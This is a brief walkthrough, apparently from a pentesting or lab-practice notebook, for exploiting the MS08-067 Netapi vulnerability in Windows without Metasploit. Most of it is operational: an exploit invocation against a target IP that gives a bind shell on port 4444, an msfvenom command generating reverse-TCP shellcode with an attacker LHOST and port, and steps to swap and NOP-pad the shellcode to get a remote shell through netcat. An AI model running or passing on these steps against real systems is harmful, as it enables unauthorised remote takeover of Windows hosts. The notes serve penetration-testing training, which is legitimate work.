# Netapi MS08-067 without metasploit

 Reference:

https://www.exploit-db.com/exploits/7132  https://www.exploit-db.com/exploits/40279	(Reverse shell modification of above payload but not working).

7132.py directly bind shell to port 4444 at server(No code modification required).
Exploit: python 7132.py 192.168.1.6 2	(& got bind shell at server side port 4444)

Above code can ge modified to get reverse shell:
i. Generate shellcode using msfvenom: msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.21 LPORT=5253 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f python -a x86 --platform windows
ii. Replace shellcode with above generated code.
iii. Add '\0x90' such that total size of payload becomes equal to 360 bytes(same as the size of bind shellcode of the exploit).

[Size of my payload generated = 348 bytes so addded "\x90" *12 to my shellcode]

& get reverse shell on nc :).
